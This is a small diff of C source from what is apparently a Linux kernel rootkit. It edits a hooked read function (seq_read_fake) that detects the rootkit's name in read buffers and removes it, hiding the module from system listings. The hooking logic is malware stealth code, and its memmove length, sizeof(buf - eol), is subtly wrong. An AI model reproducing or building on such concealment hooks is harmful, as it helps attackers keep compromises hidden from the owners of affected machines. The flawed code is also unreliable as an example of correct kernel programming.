@@ -25,7 +25,7 @@ ssize_t seq_read_fake(struct file *file, char __user *buf, size_t size, loff_t *
 		printk("Found rootkit in buffer...Removing:)\n");
 		//delete rootkit name from entries
 		memmove(p, eol + 1, sizeof(buf - eol));
-		return ret;// - (strlen(p + strlen("rootkit_main")) + 1); //ret bytes read 
+		return ret;
 	}
 	return ret;
 }
